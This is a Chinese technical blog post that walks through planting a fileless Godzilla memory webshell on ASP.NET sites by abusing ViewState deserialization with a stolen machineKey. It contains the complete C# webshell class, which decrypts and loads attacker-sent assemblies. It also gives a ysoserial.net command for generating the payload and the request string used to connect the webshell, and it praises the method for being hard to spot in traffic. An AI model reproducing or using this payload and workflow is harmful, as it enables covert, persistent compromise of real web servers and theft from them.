---
title: .Net ViewState反序列化实现无文件哥斯拉内存马
url: https://blog.wanghw.cn/security/dotnet-viewstate-no-file-godzilla-memshell.html
source: Whwlsfb's Tech Blog
date: 2022-11-03
fetch_date: 2025-10-03T21:39:38.789030
---

# .Net ViewState反序列化实现无文件哥斯拉内存马

[跳至内容](#content)

[Whwlsfb's Tech Blog](/)

# .Net ViewState反序列化实现无文件哥斯拉内存马

发布者：[whwlsfb](/author/whwlsfb)[2022年11月2日2024年5月30日](/security/dotnet-viewstate-no-file-godzilla-memshell.html)[于.Net ViewState反序列化实现无文件哥斯拉内存马留下评论](/security/dotnet-viewstate-no-file-godzilla-memshell.html#respond)

## 基础

1. 需要拿到硬编码的 machineKey，一般储存在根目录下的 web.config 文件中。
2. 较常见与使用了多点负载均衡部署的传统 ASP.net MVC 开发的网站之中，因为machineKey默认为动态生成，在负载均衡环境中，需要固定使用相同的machineKey才能互相识别其他节点生成的页面里的VIEWSTATE数据。
3. 通用系统里的 machineKey 一般不会更改。

## 前言

常规ViewState的反序列化利用方式为找到网站路径后，通过echo等方式写入aspx\ashx\asmx马，实现getshell，本文将要介绍的是一种比较特殊的利用方式，只需要在请求包之中携带包含WebShell逻辑的ViewState序列化数据，且不产生新文件，也不会写入任何网站文件，即可实现WebShell逻辑。

## 定位页面

使用ViewState反序列化，需要找到在页面中使用了ViewState功能的页面，该页面将会作为WebShell的连接地址，且最好是未授权即可访问的页面，最常见的就是登录页面。以某CMS系统为例，通过文件读取漏洞我获取到了web.config文件，并且找到了下面这个文件。

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="success.aspx.cs" Inherits="member_success" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:Literal ID="ltUserName" runat="server"></asp:Literal>
    </div>
    </form>
</body>
</html>
```

这个页面非常简单，可以作为完美的特征案例，其中的关键点则是`<form id="form1" runat="server">`，其中的`runat="server"`是必不可少的，这个属性标识了这个form将会支持ASP.net MVC的高级组件，将由服务端来处理、保存状态，并且进行额外的解析操作。

下一步则需要提取页面中的`VIEWSTATEGENERATOR`，通常直接访问该页面即可获得。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>

</title></head>
<body>
    <form method="post" action="./success.aspx" id="form1">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUIOTEyNDUzNDYPZBYCAgMPZBYCAgEPFgIeBFRleHQFJ+mqjOivgeWksei0pe+8geeUqOaIt++8muOAkOOAkeS4jeWtmOWcqGRkxr5FwhfEZkCmaPJLiXPKeRsulN0=">
</div>

<div class="aspNetHidden">

<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="60AF4XXX">
</div>
    <div>
        验证失败！用户：【】不存在
    </div>
    </form>
</body>
</html>
```

可见该页面的的`VIEWSTATEGENERATOR`为`60AF4XXX`，下一步进行Payload生成。

## Payload构造

从[devco的文章](#devco-blog)中提到的构造方式为构造一个简单的命令执行回显马然后使用yso.net的ActivitySurrogateSelectorFromFile链生成payload，但是既然能执行任意代码了，构造一个内存马也是同样可以的。

> 从.NET 4.8 版本开始，默认开启了类型检查，如出现类型转换错误，则需要使用 ActivitySurrogateDisableTypeCheck链进行 Patch 绕过，绕过后才能正常使用下文中提到的Payload。

通过编写哥斯拉的专用代码，生成序列化数据，携带在请求包之中，便可实现无实体 文件、无内存痕迹的哥斯拉内存马。

哥斯拉的内存马的payload代码：

```
class d
{
    public d()
    {
        System.Web.HttpContext Context = System.Web.HttpContext.Current;
        Context.Server.ClearError();
        Context.Response.Clear();
        try
        {
            string key = "3c6e0b8a9c15224a";
            string pass = "pas";
            string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");
            byte[] data = System.Convert.FromBase64String(Context.Request[pass]);
            data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
            if (Context.Session["payload"] == null)
            {
                Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
            }
            else
            {
                System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");
                o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString();
                byte[] r = outStream.ToArray();
                Context.Response.Write(md5.Substring(0, 16));
                Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));
            }
        }
        catch (System.Exception) { }
        Context.Response.Flush();
        Context.Response.End();
    }
}
```

保存该文件至本地，然后使用如下命令生成payload。

```
ysoserial.exe -g ActivitySurrogateSelectorFromFile -p ViewState --decryptionalg="3DES" -c="123" --decryptionkey="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  --validationalg="SHA1" --validationkey="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" --generator=60AF4XXX -c "CHANGEME.cs;System.Web.dll;System.dll"
```

通过使用输出的payload进行拼接，**注意最后的&不能漏掉**

```
__VIEWSTATE=<yso生成的内容>&__VIEWSTATEGENERATOR=60AF4XXX&
```

填写至哥斯拉的请求配置中的“左边追加数据”中。

![](/wp-content/uploads/2022/11/image.png)

搞定！

## 总结

该方式实现的隐蔽WebShell可以实现即用即走的隐蔽通道，使用ViewState的页面通常也会携带巨大的`__VIEWSTATE`参数进行POST请求，所以从流量的角度上讲也足够隐蔽。且全程未修改服务器上下文中的任何配置，也不会像.Net内存马那样一段时间不访问就会没有，所以对服务器的稳定性影响也是最小的，个人认为是目前ViewState反序列化利用方式中最佳的手段。

但是缺点也同样明显，每次请求都得携带十多KB的ViewState参数，这样显然是不太节省流量，或许还有优化的空间呢？😉

# 参考资料

* [玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門](https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/)

发布者：[whwlsfb](/author/whwlsfb)[2022年11月2日2024年5月30日](/security/dotnet-viewstate-no-file-godzilla-memshell.html)发布于[.Net安全](/category/security/net%E5%AE%89%E5%85%A8)、[WebShell](/category/security/webshell)、[信息安全](/category/security)、[内存马](/category/security/%E5%86%85%E5%AD%98%E9%A9%AC)、[技术分享](/category/tech-share)标签： [ASP.net](/tag/asp-net)、[Godzilla](/tag/godzilla)、[MemShell](/tag/memshell)、[内存马](/tag/%E5%86%85%E5%AD%98%E9%A9%AC)

## 文章导航

[上一篇文章 上一篇文章：
CVE-2022-22947 注入哥斯拉内存马](/tech-share/cve-2022-22947-inject-godzilla-memshell.html)

[下一篇文章 下一篇文章：
探寻Hessian JDK原生反序列化不出网的任意代码执行利用链](/security/hessian-deserialization-jdk-rce-gadget.html)

## 留下评论

### [取消回复](/security/dotnet-viewstate-no-file-godzilla-memshell.html#respond)

您的邮箱地址不会被公开。 必填项已用 \* 标注

评论 \*

显示名称 \*

邮箱 \*

网站

## Tags

[AES (1)](/tag/aes)[ASP.net (1)](/tag/asp-net)[BurpCrypto (3)](/tag/burpcrypto)[BurpSuite (3)](/tag/burpsuite)[Godzilla (2)](/tag/godzilla)[Hessian (1)](/tag/hessian)[Java (1)](/tag/java)[Java安全 (2)](/tag/java%E5%AE%89%E5%85%A8)[JWT (1)](/tag/jwt)[Lede (1)](/tag/lede)[MemShell (1)](/tag/memshell)[OpenWRT (1)](/tag/openwrt)[playwright (1)](/tag/playwright)[Spring (1)](/tag/spring)[Spring-Cloud-Gateway (1)](/tag/spring-cloud-gateway)[SQLi (1)](/tag/sqli)[SQLMap (1)](/tag/sqlmap)[信息安全 (2)](/tag/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8)[内存马 (2)](/tag/%E5%86%85%E5%AD%98%E9%A9%AC)[反序列化 (1)](/tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)[密码爆破 (1)](/tag/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4)[开发 (1)](/tag/%E5%BC%80%E5%8F%91)[渗透测试 (1)](/tag/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95)[网络安全 (1)](/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8)[软路由 (1)](/tag/%E8%BD%AF%E8%B7%AF%E7%94%B1)

## 分类

* [.Net安全](/category/security/net%E5%AE%89%E5%85%A8) (1)
* [BurpCrypto](/category/burpcrypto) (3)
* [Java安全](/category/security/java%E5%AE%89%E5%85%A8) (2)
* [SQL注入](/category/security/sqli) (1)
* [WebShell](/category/security/webshell) (1)
* [个人开发](/category/development) (2)
* [信息安全](/category/security) (7)
* [内存马](/category/security/%E5%86%85%E5%AD%98%E9%A9%AC) (1)
* [加密&解密](/category/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86) (3)
* [技术分享](/category/tech-share) (8)
* [渗透测试](/category/security/pentest) (2)

[Whwlsfb's Tech Blog](/),[自豪地由WordPress驱动。](https://cn.wordpress.org/)